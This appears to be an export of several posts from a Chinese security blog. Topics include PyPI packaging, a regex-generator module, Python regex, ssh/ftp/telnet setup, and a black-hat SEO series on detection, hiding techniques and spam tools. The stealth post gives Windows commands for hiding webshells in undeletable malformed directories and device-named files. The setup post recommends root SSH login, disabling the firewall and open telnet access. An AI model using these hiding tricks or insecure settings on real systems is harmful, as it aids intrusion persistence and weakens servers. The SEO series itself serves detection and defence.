    <content type="text"><![CDATA[斑驳的夜色在说什么谁能告诉我如何选择 相信使用过python的朋友一定熟悉pip，用它可以方便的管理下载第三方包。那么如何上传自己的Python package到pypi网站呢？即可以使用pip命令下载到自己的package包？ 注册pypi网站的账号访问：https://pypi.python.org/pypi?%3Aaction=register_form 注册一个账号。 打包package我们需要将自己写好的python文件，打包成.tar.gz以及.whl的压缩包。 安twine1pip install twine 编写setup.py文件在项目的根目录下，新建setup.py文件，格式如下：（最简单的）12345678910from setuptools import setupsetup( name='CreateRe', version='1.0.0', description='To Create Re Python project', url='https://github.com/tengzhangchao/CreateRe', author='nMask', author_email='tzc@maskghost.com',) 复杂一点的例子：https://github.com/pypa/sampleproject/blob/master/setup.py 生成dist1python setup.py sdist 说明：执行完命令可以看到项目目录下新增了一个dist目录，里面新增了一个.tar.gz压缩包。 生成.whl12pip install wheelpython setup.py bdist_wheel --universal 说明：执行完命令可以看到dist目录里面新增了一个.whl压缩包。 上传压缩包到pypi1234twine upload dist/*&gt;&gt;&gt;输入账号&gt;&gt;&gt;输入密码 使用pip下载安装包例子：https://pypi.python.org/pypi/CreateRe/1.0.0这是我上传的包，在主页面可以看到.tar.gz与whl两种格式的安装包，另外上传成功后等待10分钟左右，便可以使用pip直接安装了。1pip install CreateRe 参考https://packaging.python.org/tutorials/distributing-packages/]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>pypi</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自动生成正则大法暨CreateRe模块使用说明]]></title>
    <url>../../../../../../../../2017/11/07/1/</url>
    <content type="text"><![CDATA[妈妈再也不用担心我的正则啦! 老早以前就想写个自动生成正则表达式的Python模块出来，但思前想后也没有一个很好的技术方案。今晨突然灵光一闪，一气呵成下写了个CreateRe模块。说实话生成正则的能力一般，此模块能生成简单的正则表达式，适合初学者，可供压根不懂正则表达式也不想学正则的有为青年使用，简单方便一键生成。有想学习正则语法的麻烦青年，请移步：Python 正则表达式 CreateRe模块介绍 Python生成正则表达式模块，此模块用来逆向的生成正则表达式。只需要传入待匹配的字符串，以及预期想要匹配出的结果列表，即可以生成一个正则表达式。 当然目前模块还不够成熟，具体表现在：第一生成能力有限（复杂的可能生成不了），第二是生成的正则表达式不够简便（我们知道同一个匹配效果，可以有很多种正则表达式去实现，高手往往能写出最短最优化的正则，而此模块尚处于入门阶段），只适合正则初学者使用。 CreateRe模块使用Download1git clone https://github.com/tengzhangchao/CreateRe.git Import Module导入模块导入CreateRe模块，使用实例，可参考项目中的test.py文件1from CreateRe import create_re 生成正则表达式123456789# 待匹配的字符串STRING = u""# 预想匹配结果列表S = [""]cur=create_re() #实例化类RES=cur.run(STRING,S,tag=True) #生成正则表达式check_result=cur.check_res(RES,tag=True) #Check正则表达式,返回匹配后的结果 run函数参数说明 STRING 待匹配的字符串，必须为unicode格式 S 预想正则匹配结果列表，必须为List，且如果List中有中文选项，则需要为unicode格式 tag 贪婪匹配的开关，具体区别下面会介绍 演示说明1234567891011121314STRING = u'''http://thief.one nmaskhttp://tool.nmask.cn nm4khttp://home.nmask.cn nmask'''S = ["http://tool.nmask.cn"]tag=Falsecur=create_re()RES=cur.run(STRING,S,tag=tag)check_result=cur.check_res(RES,tag=tag)print RESprint check_result 运行结果：12([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;\.[a-z]&#123;5&#125;\.[a-z][a-z]) nm4[u'http://tool.nmask.cn'] 当改变tag的值，tag=True，运行结果：12([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;\.[a-z]&#123;5&#125;\.[a-z][a-z])[u'http://tool.nmask.cn', u'http://home.nmask.cn'] 说明：tag=True表示开启贪婪匹配，即生成的正则将会尽可能多的匹配出结果，缺省为False。 S的值也可以指定多个:1234567891011121314STRING = u'''http://thief.one nmaskhttp://tool.nmask.cn nm4khttp://home.nmask.cn nmask'''S = ["http://tool.nmask.cn","http://thief.one"]tag=Truecur=create_re()RES=cur.run(STRING,S,tag=tag)check_result=cur.check_res(RES,tag=tag)print RESprint check_res 运行结果:12([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;(?:.?)&#123;2&#125;[a-z]&#123;3&#125;(?:.?)&#123;4&#125;) [u'http://thief.one', u'http://tool.nmask.cn', u'http://home.nmask.cn'] 如果将tag改为False，则结果为：12([a-z]&#123;4&#125;\:/&#123;2&#125;[a-z]&#123;4&#125;(?:.?)&#123;2&#125;[a-z]&#123;3&#125;(?:.?)&#123;4&#125;) False 返回check_res=False表示生成的正则表达式，并不能匹配出想要的结果；可以将tag改为True尝试。 获取模块内置的正则表达式12345678cur=create_re()print cur.get_res("email") #邮箱print cur.get_res("phone") #电话print cur.get_res("name") #姓名print cur.get_res("id_15") #身份证 15位print cur.get_res("id_18") #身份证 18位print cur.get_res("car_id") #车牌print cur.get_res("address") #家庭住址 模块返回值1234tag=Truecur=create_re()RES=cur.run(STRING,S,tag=tag)check_result=cur.check_res(RES,tag=tag) RES 模块生成的正则表达式 check_result 利用正则表达式生成结果与预期相比较，若返回False则表示失败，返回结果列表则表示成功 项目地址https://github.com/tengzhangchao/CreateRe 在线正则测试http://tool.nmask.cn/python_re/]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>正则</tag>
        <tag>CreateRe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmask'tool框架开源说明]]></title>
    <url>../../../../../../../../2017/11/02/1/</url>
    <content type="text"><![CDATA[这是一篇内容很短的文章 事情的起因是有热心网友问起nmask’tool网站框架源码是否能够开源？本着分享的精神，我自然是很乐意开源的。只不过目前代码还没有梳理得很完善，扩展起来可能会比较麻烦，后期有时间我会把框架完善一下。关于此项目的任何进展，都会在本篇更新，尽情期待！ 当然其实这也谈不上是框架，无非是自己用Django写的一个小应用，当初没有考虑太多扩展的东西。如果大家觉得看着还行，可以去github上clone一份代码，自己搭建起来玩玩。当然我更希望大家能一起来完善这个工具平台（暂且称之为平台），多多贡献功能插件。 我当初开发这个工具平台的初衷是整合一些已有的功能，以web的形式免费向大家提供服务，避免重复造轮子。此工具平台主要侧重于安全类的功能开发，当然目前来看还是开发类的功能比较多，这也是因为我最近工作繁忙，还没来得及去更新安全类的一些功能。 项目GITHUB地址：https://github.com/tengzhangchao/tool-nmask 说明：关于如何进行功能扩展？我后期会整理一份开发文档，目前大家可以先自行研究研究代码。有任何项目上的问题，可以开issues提问，或者进群交流，也可以发送邮件，当然最方便的就是在文章下方留言啦。]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>nmask&#39;tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 正则表达式]]></title>
    <url>../../../../../../../../2017/10/30/1/</url>
    <content type="text"><![CDATA[悄悄问圣僧，女儿美不美 好久没有更新文章啦，主要是实在不知道写点啥。最近忙着搞安全开发，很多知识的学习都暂时停滞了，因此也没啥新知识可以分享的。想起之前一直有人问我怎么写正则表达式，我就在本篇结合Python语言，总结下正则表达式到底该怎么写吧。 正则规则想要写好正则表达式，就先学习下它的规则吧！123456789101112131415161718[]:指定一个字符集,'[abc\s\d]'中，a,b,c任意一个满足便可以。&#123;&#125;:重复,a&#123;8&#125;=aaaaaaaa;b&#123;1,3&#125;:重复1-3次。^:匹配行首,'[^abc]'中，除了a,b,c，其他的都可以;'^hello'表示行首是hello的字符串。$:匹配行尾,'boy$'表示行尾是boy的字符串。\:转义字符\d:[0-9]\w:[a-zA-Z0-9_]\s:空格或者tab或者换行，也包括\r\n*:指定前一个字符匹配0次或多次。'ab*',可以匹配a，ab，abb，abbbb等。+:指定前一个字符匹配1次或多次。?:指定前一个字符匹配0次或1次，加载重复后面可以最小匹配。.:表示任意字符（换行符\n除外re.DOTALL可以匹配所有字符串，包括换行；re.compile(r".*",re.DOTALL)(?i)：在正则表达式前面加上这个，便可以忽略大小写;如:res=r"(?i)[abc]"(asp|php|jsp)：表示或者，跟[abc]的区别在于它是匹配一个字符串，而[]只是单个字符。r'((?[\d]*)&#123;2,3&#125;)':在内括号前加上?:,结果只匹配外面括号的内容。 Python中使用正则我们知道正则并不是python特有的，很多编程语言都有正则。而在Python中想要使用正则，需要借助re模块。12345678910111213141516171819# 导入模块import reres=r"[\d]&#123;2&#125;" #正则表达式content="abcd12345678abcd" #待匹配的内容# 直接匹配a=re.search(res,content) if a: print a.group()# 编译 （加快匹配速度）p_tel=re.compile(res) 将正则表达式编译，提高运行速度。p_tel.findall(content) 找到RE匹配的所有子串，并作为列表返回。p_tel.match(content) 决定RE是否在字符串刚开始的位置匹配。p_tel.search(content) 扫描字符串，找到这个RE匹配的位置。p_tel.group(num=0) 返回全部匹配对象。（或指定编号是num的子组）p_tel.sub(pattern,string) 对正则表达式中所有匹配string的用pattern替换。p_tel.split(pattern，string) 根据正则表达式pattern中的分隔符把字符string分隔为一个列表。 贪婪模式需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。例子：12&gt;&gt;&gt; re.match(r'^(\d+)(0*)$', '123400').groups()('123400', '') 说明：由于\d+采用贪婪匹配，直接把后面的0全部匹配了，结果0*只能匹配空字符串了。必须让\d+采用非贪婪匹配（也就是尽可能少匹配），才能把后面的0匹配出来，加个?就可以让\d+采用非贪婪匹配：12&gt;&gt;&gt; re.match(r'^(\d+?)(0*)$', '123400').groups()('1234', '00') 正则实例1234567891011121314151617匹配IP地址的正则表达式 res=/(\d+)\.(\d+)\.(\d+)\.(\d+)/g匹配空行的正则表达式：res=\n[\s| ]*\r匹配HTML标记的正则表达式：res=/&lt;(.*)&gt;.*&lt;\/\1&gt;|&lt;(.*) \/&gt;/匹配首尾空格的正则表达式：res=(^\s*)|(\s*$)匹配中文字符的正则表达式： res=[\u4e00-\u9fa5] #python中需要转换为unicode匹配双字节字符(包括汉字在内)：res=[^\x00-\xff]user_phone=r"((?:13[0-9]|14[579]|15[0-3,5-9]|17[0135678]|18[0-9])\d&#123;8&#125;)"user_name=r""+u"([\u4e00-\u9fa5\·]&#123;2,3&#125;)"user_id_18=r"([1-9]\d&#123;5&#125;(?:1[9,8]\d&#123;2&#125;|20[0,1]\d)(?:0[1-9]|1[0-2])(?:0[1-9]|1[0-9]|2[0-9]|3[0,1])\d&#123;3&#125;[\dxX])" user_id_15=r"([1-9]\d&#123;7&#125;(?:0[1-9]|1[0-2])(?:0[1-9]|1[0-9]|2[0-9]|3[0,1])\d&#123;2&#125;[\dxX])"car_id=r""+u"([京津沪渝冀豫云辽黑湘皖鲁新苏浙赣鄂桂甘晋蒙陕吉闽贵粤青藏川宁琼使领]&#123;1&#125;[A-Z]&#123;1&#125;[A-Z0-9]&#123;4&#125;[A-Z0-9挂学警港澳]&#123;1&#125;)"email=r"([a-z_0-9.-]&#123;2,64&#125;@[a-z0-9-]&#123;2,200&#125;\.[a-z]&#123;2,6&#125;)"address=r""+u"([\u4e00-\u9fa5\·]&#123;6,20&#125;)"Python中针对 unicode正则写法：res=ur"[\u4e00-\u9fa5]" 正则平台建议在代码中使用正则前，先测试下正则的质量。为了方便使用，我自己写了一个在线工具，需要的可以用用：http://tool.nmask.cn/python_re/]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh、telnet、ftp安装使用小记]]></title>
    <url>../../../../../../../../2017/10/11/1/</url>
    <content type="text"><![CDATA[爱你的每个瞬间像飞驰而过的地铁 ssh、telnet、ftp相信大家都很熟悉，它们是linux中最常用的几个服务。一般linux系统缺省是安装了ssh、ftp、telnet的，但也有些情况是没有安装的。本篇主要记录如何在linux上搭建这几个服务，并简单记录对应服务的客户端使用方法。 SSH服务端安装查看ssh服务是否已经安装:1&gt;&gt;rpm -qa | grep ssh 若已经安装，结果如下：1234libssh2-1.4.3-10.el7_2.1.x86_64openssh-7.4p1-12.el7_4.x86_64openssh-clients-7.4p1-12.el7_4.x86_64openssh-server-7.4p1-12.el7_4.x86_64 若没有安装，则安装openssh服务端：12apt-get install openssh-server #ubuntuyum -y install openssh-server #centos 开启关闭ssh服务：123service sshd(ssh) startservice sshd(ssh) stopservice sshd(ssh) restart 或者123/etc/init.d/sshd start/etc/init.d/sshd stop/etc/init.d/sshd restart centos7:123/bin/systemctl start sshd.service/bin/systemctl stop sshd.service/bin/systemctl restart sshd.service MAC开启ssh服务：123sudo systemsetup -getremotelogin #判断状态sudo systemsetup -setremotelogin on #开启sshsudo systemsetup -setremotelogin off #关闭ssh 服务端配置ssh配置文件：1vim /etc/ssh/sshd_config 使root用户能够ssh，注释掉 #PermitRootLogin without-password，添加 PermitRootLogin yes。更多配置信息，可参考：http://blog.csdn.net/zhu_xun/article/details/18304441 关闭防火墙：1/etc/init.d/iptables stop 开机自启动设置：1update-rc.d ssh enable 关闭开机自启动：1update-rc.d ssh disable 说明：以上改动配置文件，需要重启生效。 客户端安装缺省linux是安装了客户端的。12apt-get install openssh-client #ubuntuyum install openssh-clients #centos 客户端使用基础使用12&gt;&gt;ssh root@10.0.0.1 #用密码登录&gt;&gt;ssh -i ~/.ssh/test 10.0.0.1 #用密钥登陆 记住密码记住账号密码，不用每次都重新输入：1cat .ssh/config（没有的话就去创建,vim） 写入内容：1234Host * ControlMaster auto ControlPath ~/.ssh/%h-%p-%r ControlPersist yes 这样每次登陆一个新的地址以后，.ssh/下都会生成一个配置文件，就会记录账号密码。 文件移动1scp /localdirectory/example1.txt &lt;username&gt;@&lt;remote&gt;:&lt;path&gt; 可以复制example1.txt 到远程电脑指定的 。你也可以让为空白，来复制远程电脑的根文件夹。 1scp &lt;username&gt;@&lt;remote&gt;:/home/example1.txt ./ 会把example1.txt从远程电脑的主目录移动到本地电脑的当前目录。 ssh密钥对客户端生成密钥对：1ssh-keygen -t rsa -f test -C "test key" -t 加密类型 -f 密钥文件名 -C 备注 说明：执行命令会在.ssh（若没有可自行创建~/.ssh目录）目录下生成test、test.pub文件，test是私钥，test.pub是公钥。 服务端导入客户端的公钥：1$ cat test.pub &gt;&gt; .ssh/authorized_keys 修改权限：1chmod 700 .ssh 客户端可通过私钥文件去登录，而不需要密码登录1sudo ssh -i ~/.ssh/test 10.0.0.1 FTP服务端安装1234sudo apt-get updatesudo apt-get install vsftpdyum install vsftpd 启动服务：1sudo service vsftpd start 服务端配置FTP服务端配置：1/etc/vsftpd/vsftpd.conf #配置文件 配置文件内容：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586anonymous_enable=YES允许匿名用户登录local_enable=YES允许系统用户名登录write_enable=YES允许使用任何可以修改文件系统的FTP的指令local_umask=022本地用户新增档案的权限#anon_upload_enable=YES允许匿名用户上传文件#anon_mkdir_write_enable=YES允许匿名用户创建新目录dirmessage_enable=YES允许为目录配置显示信息,显示每个目录下面的message_file文件的内容xferlog_enable=YES开启日记功能 connect_from_port_20=YES使用标准的20端口来连接ftp #chown_uploads=YES所有匿名上传的文件的所属用户将会被更改成chown_username#chown_username=whoever匿名上传文件所属用户名 #xferlog_file=/var/log/vsftpd.log日志文件位置 xferlog_std_format=YES使用标准格式 #idle_session_timeout=600空闲连接超时 #data_connection_timeout=120数据传输超时 #nopriv_user=ftpsecure当服务器运行于最底层时使用的用户名 #async_abor_enable=YES允许使用\"async ABOR\"命令,一般不用,容易出问题 #ascii_upload_enable=YES管控是否可用ASCII 模式上传。默认值为NO#ascii_download_enable=YES管控是否可用ASCII 模式下载。默认值为NO#ftpd_banner=Welcome to blah FTP service. login时显示欢迎信息.如果设置了banner_file则此设置无效 #deny_email_enable=YES如果匿名用户需要密码,那么使用banned_email_file里面的电子邮件地址的用户不能登录#banned_email_file=/etc/vsftpd/banned_emails禁止使用匿名用户登陆时作为密码的电子邮件地址 #chroot_list_enable=YES如果启动这项功能，则所有列在chroot_list_file中的使用者不能更改根目录 #chroot_list_file=/etc/vsftpd/chroot_list定义不能更改用户主目录的文件 #ls_recurse_enable=YES 是否能使用ls -R命令以防止浪费大量的服务器资源 listen=YES 绑定到listen_port指定的端口,既然都绑定了也就是每时都开着的,就是那个什么standalone模式 pam_service_name=vsftpd 定义PAM 所使用的名称，预设为vsftpduserlist_enable=YES 若启用此选项,userlist_deny选项才被启动 tcp_wrappers=YES 开启tcp_wrappers支持 客户端使用ftp连接：123ftp root@10.0.0.1ftp 10.0.0.1ftp 10.0.0.1 21 TELNET服务端安装1yum -y install xinetd telnet telnet-server 开启telnet服务：1234systemctl enable telnet.socket systemctl start telnet.socket systemctl enable xinetd systemctl start xinetd 服务端配置编辑：/etc/xinetd.d/telnet文件 要允许通过xinetd联接telnet，需要编辑/etc/xinetd.d/telnet文件：1vim /etc/xinetd.d/telnet 将’disable’的值从’yes’修改为’no’。 要允许telnet从其他机子联接到本机，需要添加允许规则:123vim/etc/hosts.allow添加如下行：in.telnetd: ALL 如果需要开机自动开启该服务，将xinetd加入到/etc/rc.conf的”DAEMONS”中：1DAEMONS=(syslog-ng network netfs crond ............ xinetd) 说明：centos7下面安装telnet 没有生成 /etc/xinetd.d/telnet 文件。 客户端使用12telnet 10.0.0.1 [port]&gt;&gt;输入账号密码即可]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>ssh</tag>
        <tag>telnet</tag>
        <tag>ftp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑帽SEO剖析之总结篇]]></title>
    <url>../../../../../../../../2017/09/28/4/</url>
    <content type="text"><![CDATA[视而不见，谓合道於希夷；挹之则盈，方同功於造化 此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为总结篇，主要介绍黑帽seo行为的检测以及预防。可以说此系列前面三篇文章，是为最后一篇做的铺垫，毕竟作为安全工程师我们真正需要做的，是帮助客户去防御攻击，抵御黑产。 如何检测自身网站是否被劫持？ 前面介绍了很多关于黑帽seo的手法，那作为站长或者运维该怎么去监控自身网站是否被入侵，且被黑帽seo利用了呢？这里不说如何检测入侵，因为这不是本文的范畴，我们只谈如何检测被黑帽seo利用，这里提供几个思路。 内部监控 可以监控服务器web目录下的文件改动情况，一般黑帽seo都需要改动web目录下的文件（新增文件，或更改文件内容）。当然有些只改变nginx配置就可以达到目的，因此nginx等服务器的配置文件也需要进行监控。 小结：内部监控比较类似防篡改的检测，只是面对网页劫持，除了响应文件内容改动以外，还需要响应新增文件等行为，包括服务器配置文件的改动。 外部检测 黑帽seo手法从根本上是欺骗搜索引擎，因此检测本质上也可以从搜索引擎出发。检测网站在搜索引擎搜索显示下是否出现了敏感的内容，比如：博彩、色情等。由于网页劫持手法可以动态调控显示内容，比如不同地区点击返回不同的内容等，因此这需要我们的检测程序能够多维度得进行检测。 多维度包括但不局限于以下几种： 采用不同地区的IP检测目标网站 采用不同时间段内检测目标网站 采用不同的UA访问目标网站 采用不同的访问方式目标网站（百度搜索跳转、直接访问域名） 检测步骤分为： 获取搜索引擎搜索结果 模拟浏览器访问搜索结果网页 解析网页源码等元素 匹配规则判断网站是否被劫持 获取搜索引擎搜索结果 这一步骤需要爬取搜索引擎，比如我们要判断thief.one网站是否被劫持，可以搜索百度：site:thief.one 色情。关键词需要自己搜集，然后利用爬虫爬取百度的搜索结果。 显然这一步需要对抗百度搜索引擎，防止被其屏蔽问题，还要能够正确的获取百度的搜索结果。关于爬起搜索引擎可参考：爬取搜索引擎之寻你千百度爬取搜索引擎之搜狗 模拟浏览器访问搜索结果网页 当爬到所需要的网页链接后，我们需要重放url获取信息。这一步需要能够动态执行网页中嵌入的js代码，动态跟踪网页的走向（跳转）。这里推荐使用phantomjs当然也可以使用其他webkit。 解析网页源码等元素 可以利用python解析网页源码、网页标题、URL、js等内容，最方便的做法是获取各个参数的内容，处理数据打标后扔到机器学习的算法中进行模型计算。 匹配规则判断网站是否被劫持 可以使用正则等方式，根据黑帽seo等特征建立规则库去匹配。当然也可以利用机器学习的方式去对相关网页进行分类，我们曾经使用过某种算法，将准确率提高到了90%左右。 小结：外部检测难度比较大，目前黑帽seo主要针对百度，因此这相当于去检测百度的搜索结果；而如何模拟浏览器访问也是一大难题，当然最重要的是最后的机器学习，如何训练模型。 谁来为此买单？ 基于黑帽SEO大多数都为博彩赌博行业做推广，将会增加网民沉迷网络赌博的风险，纵观身边因为网络赌博而家破人亡的事情不在少数；而也有一部分黑帽SEO在为枪支弹药、毒品违禁药物做推广，更是为犯罪分子提供了便利。在此之前，我一直认为黑产只是暴利并无太大危害，然而通过对黑帽SEO的研究发现，其危害的绝不仅仅只是经济而已。那么这一切，应该由谁来买单？ 首先网站管理者难辞其咎，正因为管理员安全意识的淡薄，网站安全性不高，导致被入侵最终成为黑产的一部分。在我自身处理的几起类似事件中，网站管理员往往是一副无关紧要的态度，即使网站已经被黑帽SEO利用，也觉得没有对网站本身造成什么危害，觉悟性不高。 其次搜索引擎应该担负一定的责任，因为黑帽SEO行为主要针对搜索引擎，说白了就是利用搜索引擎算法漏洞，提升非法网站权重。国内大多数网民上网都使用搜索引擎。搜索引擎既然有权利决定显示哪些资源给用户，那么也必须有义务确保这些资源的安全性、正规性。 如何制止与防御？如果您是网民，制止黑帽seo最好的方式就是科学上网，发现非法网站及时提交到安全联盟或向搜索引擎举报。如果您是网站管理员，请做好自身网站的安全建设，及时补漏；若已发现被入侵，及时联系技术人员处理。 谈谈心 当在写这篇文章前，我思索着尽量能够全面地介绍黑帽SEO知识以及手法。当开始写这篇文章的时候，我便有点无从下手，因为涉及知识面太广，手法又非常丰富，我研究黑帽SEO不久了解也不算深入。而当我写完这篇文章的时候，我觉得这一切才刚刚开始，也许我此刻抒写的正是黑客几年前或十几年前所用或者所流行的技术。 传送门黑帽SEO剖析之总结篇黑帽SEO剖析之隐身篇黑帽SEO剖析之工具篇黑帽SEO剖析之手法篇]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑帽SEO剖析之隐身篇]]></title>
    <url>../../../../../../../../2017/09/28/3/</url>
    <content type="text"><![CDATA[视而不见，谓合道於希夷；挹之则盈，方同功於造化 此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为隐身篇，主要介绍黑帽seo中一些隐身的手段。黑帽seo与其他黑产行为不同的是，它需要时间去创造价值。如果是倒卖数据，只需要入侵服务器脱裤走人，而黑帽seo需要潜伏在服务器上一段时间，因为它主要靠引流来创造价值。那么如何做到不被服务器运维发现就至关重要了，也是黑帽seo行为是否能最终成功的关键。 隐身的技术 在处理的一些入侵应急响应事件中，我们发现有些网站被挂恶意页面达数月甚至数年之久，而在此期间管理员竟然毫无察觉。有时这并非是管理员的粗心大意，而是黑客过于狡猾。在了解了我之前所介绍的网页劫持手段后，我想你大概能了解这其中的缘由了，网页劫持能控制跳转控制页面呈现的内容，这便是难以被管理员发现的主要原因。除此之外，寄生虫程序能够自动生成网页也使得其生存能力很强，不易被根除。其次我们在发现网站被挂恶意网页后，通常会登录服务器进行查看，而有时我们很难找到被非法篡改或者被恶意植入的脚本文件，因为此类型文件被黑客精心地隐藏了起来。那么除了上述手段之外，黑客还有哪些手段来隐藏自身，使之生生不灭？ 网页劫持控制跳转网页劫持中的控制跳转就是为了隐藏网站已被入侵的事实，让网站管理员不容易发现。 nginx二级目录反向代理技术 通过配置nginx/apache等中间件配置文件设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。即浏览者在打开thief.one/2016/目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据）。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除也不易被发现。 隐藏文件 给文件设置属性隐藏。我曾经遇到过此类事件，当时我们一个技术人员通过肉眼选择了服务器上一批web目录下的文件进行copy。而当我们对这些文件进行扫描时，并未发现任何异常，一切都变得匪夷所思。而最后的结果让我们哭笑不得，原来恶意文件被设置成了属性隐藏，通过肉眼观察的技术人员并没有将此文件copy下来，因此这也算是一种有效的障眼法。 不死文件不死文件指的是删除不了的webshell或者是非法页面文件（.html或者动态文件），此类事件在实际中没有遇到过，但理论上确实可行。 设置畸形目录目录名中存在一个或多个. (点、英文句号)1md a..\ 该目录无法被手工删除，当然命令行可以删除1rd /s /q a..\ 特殊文件名其实是系统设备名，这是Windows 系统保留的文件名，普通方法无法访问，主要有：lpt,aux,com1-9,prn,nul,con，例如：lpt.txt、com1.txt 、aux.txt，aux.pasp，aux.php等。1echo hello&gt;\\.\c:\a..\aux.txt 畸形目录+特殊文件名12md c:\a..\echo hello&gt;\\.\c:\a..\aux.asp #注意：这里的路径要写绝对路径（上传的aux.php木马可以被执行） 删除：1rd /s /q \\.\c:\a..\ 方法还有很多，不一一列举了。 传送门黑帽SEO剖析之总结篇黑帽SEO剖析之隐身篇黑帽SEO剖析之工具篇黑帽SEO剖析之手法篇]]></content>
      <categories>
        <category>黑产研究</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑帽SEO剖析之工具篇]]></title>
    <url>../../../../../../../../2017/09/28/2/</url>
    <content type="text"><![CDATA[视而不见，谓合道於希夷；挹之则盈，方同功於造化 此系统文章总共分为四篇，分别是手法篇、工具篇、隐藏篇、总结篇；本篇为工具篇，主要介绍黑帽seo中经常使用到的一些工具，及其用途。 搞黑帽SEO往往都是批量操作，因此自动化工具不可或缺，也是整个黑产环中比较重要的一环。本篇将会介绍几款黑帽seo中常用的工具，由于本篇写于一年前，因此部分工具可能已淘汰或者升级。 寄生虫（jsc) 植入寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。简单来说，寄生虫是一种程序，此程序的功能是能够自己创建网页文件，而创建的条件可以定制，比如说当有人访问某个页面时就会触发寄生虫程序生成一批新的网页文件，或者每天定时创建等等。 我曾经在给一个客户处理应急响应事件时，便遇到过此类状况。每当我清理完所有恶意网页文件后，服务器上都会不时地自动生成一大批新的网页文件。令人头疼的是，当时我完全掌握不了生成新文件的规律。后来我们在一一排除web服务器上的文件时，发现了其中一个恶意的动态语言文件（由于种种原因，样本没有保留下来），此恶意文件就是类似寄生虫程序，会在我们访问此网站的某个页面触发，生成一批新的恶意页面。 寄生虫分类 寄生虫分为动态与静态，动态寄生虫程序的就是会不断自动生成新的页面（如我上面所述案例），或者是刷新页面以后自动变化内容，动态寄生虫生成的恶意文件往往是asp/php后缀文件；而静态寄生虫程序生成的页面往往都是固定不变的内容，大多为html后缀文件。 寄生虫模板 寄生虫程序生成的页面往往都是有固定模板的，模板的好坏有时也决定了是否能够被搜索引擎快速收录，以下是我收集的两种寄生虫程序生成的模板页面。寄生虫模板案例一：寄生虫模板案例二： 静态寄生虫挂二级目录案例案例来自去年处理的一起入侵检测事件，我们发现目标网站上被挂了非法推广页面，如下图所示：通过登录web服务器查看，我们发现了网站根目录下多了一个二级目录ds，而ds目录内放满了html文件，都是通过寄生虫生成的。（由于时间久远，html样本文件已丢失）通过登录服务器日志分析，我们最终发现黑客是通过web应用程序漏洞获取到了服务器权限，并在该服务器上利用静态寄生虫程序创建了大量恶意的html后缀文件，并存放在ds目录下，其利用的便是高权重网站二级目录手法。 以上占用大量篇幅介绍了很多黑帽seo的手法，也介绍了寄生虫程序这一自动生成网页文件的利器。那么黑帽seo是如何让这些非法页面快速被搜索引擎收录的呢？我们知道如果这些恶意推广的页面无法被搜索引擎收录，那么黑帽SEO就达不到预期的效果。起初在研究黑帽seo时我也一直在思考这个问题，按常理搜索引擎不应该会收录具有恶意内容的推广页面，而事实是目前我们随便在百度上搜site:.gov.cn 博彩或者site:.edu.cn 色情，就会出现一大批被挂上博彩色情的政府教育机构网站。显然这些页面目前还是能够很好地被搜索引擎收录，甚至能很快被收录，我曾经发现过几分钟内被收录的恶意页面。那么是搜索引擎故意为之，还是有人利用了搜索引擎的某些特征或者说漏洞？要理解这个问题，我想必须得介绍一下黑帽SEO又一大利器—蜘蛛池。 蜘蛛池 蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。简单来说就是通过购买大量域名，租用大量服务器，批量搭建网站形成站群。而这些网站彼此之间形成链轮，网站内容大多为超链接，或者一些动态的新闻内容等。经过一段时间的运营，此站群每天就能吸引一定量的搜索引擎蜘蛛，蜘蛛的多少要看网站内容搭建的好坏以及域名的个数。当蜘蛛数量达到一个量级且稳定以后，就可以往里面添加想要推广的网页，比如通过黑帽SEO手段创建的非法页面。这一过程就好比在一个高权重网站上添加友情链接，会达到快速收录的目的。 蜘蛛池交易平台 我随便百度了一下，发现互联网上存在很多蜘蛛池交易平台，即可通过互联网上的蜘蛛池推广恶意网页。这种方式省去了自己搭建蜘蛛池的麻烦，却也为黑帽seo人员提供了便利。在收集资料时，我挑选了其中一个交易平台，截图如下： 蜘蛛池站点案例在为本篇文章收集黑帽SEO相关资料时，我发现了一款经典的蜘蛛池站点，在此分享。其特点是内容动态生成，刷新页面发现内容随机改变很明显此网站内容都是通过动态寄生虫程序生成的，且不断变化内容来增加百度对其收录。（百度目前对原创内容的收录率比较高） 